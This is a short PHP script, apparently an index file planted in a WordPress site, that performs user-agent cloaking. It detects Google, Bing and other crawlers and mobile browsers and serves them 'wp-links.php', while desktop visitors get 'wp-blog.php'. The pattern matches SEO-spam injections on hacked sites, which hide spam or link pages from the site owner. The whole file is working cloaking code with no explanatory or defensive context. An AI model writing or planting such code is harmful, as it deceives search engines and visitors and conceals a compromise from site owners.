<?php
$bot_user_agents=array("Googlebot","Googlebot-Image","Googlebot-News","Googlebot-Video","Storebot-Google","Google-InspectionTool","GoogleOther","GoogleOther-Image","GoogleOther-Video","Google-CloudVertexBot","Google-Extended","APIs-Google","AdsBot-Google-Mobile","AdsBot-Google","Mediapartners-Google","FeedFetcher-Google","Google-Favicon","Google Favicon","Googlebot-Favicon","Google-Site-Verification","Google-Read-Aloud","GoogleProducer","Google Web Preview","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot","Sogou","Exabot","facebookexternalhit","ia_archiver","Alexa Crawler","AhrefsBot","Semrushbot");

$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

function is_bot($user_agent, $bot_user_agents) {
    foreach ($bot_user_agents as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function is_mobile($user_agent) {
    $mobile_agents = array('Mobile', 'Android', 'Silk/', 'Kindle', 'BlackBerry', 'Opera Mini', 'Opera Mobi', 'iPhone', 'iPad');
    foreach ($mobile_agents as $mobile) {
        if (stripos($user_agent, $mobile) !== false) {
            return true;
        }
    }
    return false;
}

if (is_bot($user_agent, $bot_user_agents)) {
    include 'wp-links.php';
    exit;
} elseif (is_mobile($user_agent)) {
    include 'wp-links.php';
    exit;
} else {
    include 'wp-blog.php';
    exit;
}
?>